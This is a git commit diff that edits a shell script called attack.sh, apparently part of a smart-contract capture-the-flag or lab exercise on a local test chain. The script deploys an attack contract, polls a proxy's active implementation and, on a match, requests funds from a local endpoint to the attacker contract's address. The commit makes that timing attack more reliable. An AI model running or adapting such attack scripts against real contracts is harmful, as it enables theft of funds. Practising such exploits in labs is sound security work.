ee3addb804ddf35ebb751430a99e396e550f8526
Mathias Scherer <mathias@blockbite.ch>
2024-12-11 13:57:55 +0100

    fix: makes the attack script more reliable

--- script/attack.sh
+++ script/attack.sh
@@ -1,13 +1,16 @@
 
 forge script --chain sepolia --rpc-url http://127.0.0.1:8080/rpc --broadcast -vvvv script/DeployAttack.s.sol
 target_active="0x000000000000000000000000e5ed47bcc12028b9be183a80b8821119e9397ef7"
+attacker_contract=$(cat broadcast/DeployAttack.s.sol/31337/run-latest.json | jq '.transactions[0].contractAddress' | tr -d '"')
+echo "attacking with $attacker_contract"
 while [ 1 -eq 1 ]
 do
     current_active=$(cast call 0xe6cc6358e23fcb274c0e0696d6f9635bd9f223b1  "getImplementation1599d()" --rpc-url http://localhost:8080/rpc)
     echo "Currently Active:$current_active"
     if [ "$current_active" == "$target_active" ]; then
         echo "Attacking"
-        curl http://localhost:8080/get-funds -H "Content-Type: application/json" -d '{"address":"0x360B0B52025095275702d094Fce7C0d6087E3676"}'
+        sleep 5
+        curl http://localhost:8080/get-funds -H "Content-Type: application/json" -d "{\"address\":\"$attacker_contract\"}"
         exit 0
     else
         echo "Not Attacking"
